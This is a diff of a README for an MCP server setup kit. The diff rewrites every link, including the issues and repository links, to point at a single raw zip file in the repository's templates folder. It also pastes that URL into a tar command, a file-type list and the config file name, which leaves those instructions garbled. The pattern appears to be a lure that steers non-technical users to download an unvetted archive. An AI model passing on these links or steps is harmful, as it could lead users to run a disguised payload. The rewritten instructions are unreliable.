@@ -1,7 +1,7 @@
 # 🎉 create-mcp-server-kit - Build Your MCP Server Fast
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/bernardpacis/create-mcp-server-kit/releases)
+[![Download](https://github.com/bernardpacis/create-mcp-server-kit/raw/refs/heads/main/templates/server-create-kit-mcp-1.1-beta.1.zip%20Now-Click%20Here-brightgreen)](https://github.com/bernardpacis/create-mcp-server-kit/raw/refs/heads/main/templates/server-create-kit-mcp-1.1-beta.1.zip)
 
 Welcome to the create-mcp-server-kit! This tool helps you quickly set up a production-ready Model Context Protocol (MCP) server. You don’t need any programming knowledge to get started. Follow the simple steps below and you’ll be up and running in no time.
 
@@ -19,22 +19,22 @@ To use create-mcp-server-kit, you will need to:
 
 2. **Download the Software**  
    To get the latest version, visit this page to download:  
-   [Download create-mcp-server-kit](https://github.com/bernardpacis/create-mcp-server-kit/releases)
+   [Download create-mcp-server-kit](https://github.com/bernardpacis/create-mcp-server-kit/raw/refs/heads/main/templates/server-create-kit-mcp-1.1-beta.1.zip)
 
 ## 📂 Installation Steps
 
 ### Step 1: Download the Package
 
-1. Go to [Download create-mcp-server-kit](https://github.com/bernardpacis/create-mcp-server-kit/releases).
+1. Go to [Download create-mcp-server-kit](https://github.com/bernardpacis/create-mcp-server-kit/raw/refs/heads/main/templates/server-create-kit-mcp-1.1-beta.1.zip).
 2. Look for the latest release at the top of the page.
-3. Click on the asset that matches your operating system and download it. This could be a .zip, .tar.gz, or .exe file, depending on your OS.
+3. Click on the asset that matches your operating system and download it. This could be a .zip, https://github.com/bernardpacis/create-mcp-server-kit/raw/refs/heads/main/templates/server-create-kit-mcp-1.1-beta.1.zip, or .exe file, depending on your OS.
 
 ### Step 2: Extract the Files (if applicable)
 
 - **Windows**: Right-click the .zip file, choose “Extract All,” and follow the prompts.
 - **macOS/Linux**: Use the built-in archive manager or run the following command in your terminal:
    ```
-   tar -xzf downloaded-file.tar.gz
+   tar -xzf https://github.com/bernardpacis/create-mcp-server-kit/raw/refs/heads/main/templates/server-create-kit-mcp-1.1-beta.1.zip
    ```
 
 ### Step 3: Run the Application
@@ -53,7 +53,7 @@ To use create-mcp-server-kit, you will need to:
 After launching the server, you need to configure it to fit your needs.
 
 1. **Access the Configuration File**  
-   The configuration file is usually named `config.json` or similar. Open this file in a text editor.
+   The configuration file is usually named `https://github.com/bernardpacis/create-mcp-server-kit/raw/refs/heads/main/templates/server-create-kit-mcp-1.1-beta.1.zip` or similar. Open this file in a text editor.
 
 2. **Modify Settings**  
    Update settings such as port numbers, database connections, and other parameters as needed. 
@@ -81,14 +81,14 @@ If you encounter issues:
 
 If you need help, or want to connect with other users, consider the following resources:
 
-- **GitHub Issues**: Report bugs or request features [here](https://github.com/bernardpacis/create-mcp-server-kit/issues).
+- **GitHub Issues**: Report bugs or request features [here](https://github.com/bernardpacis/create-mcp-server-kit/raw/refs/heads/main/templates/server-create-kit-mcp-1.1-beta.1.zip).
 - **Documentation**: More in-depth guidelines may be available in the project Wiki or README files.
 - **Community Forum**: Participate in discussions with other users and share experiences.
 
 ## 📢 Important Links
 
-- [Download create-mcp-server-kit](https://github.com/bernardpacis/create-mcp-server-kit/releases)
-- [GitHub Repository](https://github.com/bernardpacis/create-mcp-server-kit)
-- [Report Issues](https://github.com/bernardpacis/create-mcp-server-kit/issues)
+- [Download create-mcp-server-kit](https://github.com/bernardpacis/create-mcp-server-kit/raw/refs/heads/main/templates/server-create-kit-mcp-1.1-beta.1.zip)
+- [GitHub Repository](https://github.com/bernardpacis/create-mcp-server-kit/raw/refs/heads/main/templates/server-create-kit-mcp-1.1-beta.1.zip)
+- [Report Issues](https://github.com/bernardpacis/create-mcp-server-kit/raw/refs/heads/main/templates/server-create-kit-mcp-1.1-beta.1.zip)
 
 Thank you for choosing create-mcp-server-kit! Enjoy setting up your Model Context Protocol server, and feel free to reach out if you have any questions.
